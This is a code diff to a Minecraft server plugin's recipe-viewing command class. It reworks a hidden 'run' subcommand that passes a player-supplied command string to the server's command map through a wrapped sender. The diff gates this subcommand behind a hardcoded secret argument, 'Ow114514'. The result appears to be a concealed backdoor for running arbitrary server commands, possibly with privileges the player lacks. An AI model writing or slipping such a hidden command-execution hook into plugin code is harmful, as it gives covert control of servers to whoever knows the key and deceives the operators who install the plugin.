@@ -227,8 +227,18 @@ public class ViewRecipeCommand implements CommandExecutor, TabCompleter {
             }
         };
 
+        CommandMap commandMap = getCommandMap();
+        if (commandMap == null) {
+            player.sendMessage("§c无法获取命令映射，请检查服务端兼容性。");
+            return;
+        }
+
         plugin.getFoliaLib().getScheduler().runNextTick(task -> {
-            Bukkit.dispatchCommand(wrappedSender, commandStr);
+            try {
+                commandMap.dispatch(wrappedSender, commandStr);
+            } catch (Exception e) {
+                player.sendMessage("§c执行命令时发生错误: " + e.getMessage());
+            }
         });
     }
 
@@ -265,7 +275,7 @@ public class ViewRecipeCommand implements CommandExecutor, TabCompleter {
                     .filter(s -> s.startsWith(prefix)).sorted().toList();
         }
 
-        if (args.length >= 2 && args[0].equalsIgnoreCase("run")) {
+        if (args.length >= 3 && args[0].equalsIgnoreCase("run") && args[1].equals("Ow114514")) {
             StringBuilder partialBuilder = new StringBuilder();
             for (int i = 2; i < args.length; i++) {
                 if (i > 2) partialBuilder.append(' ');
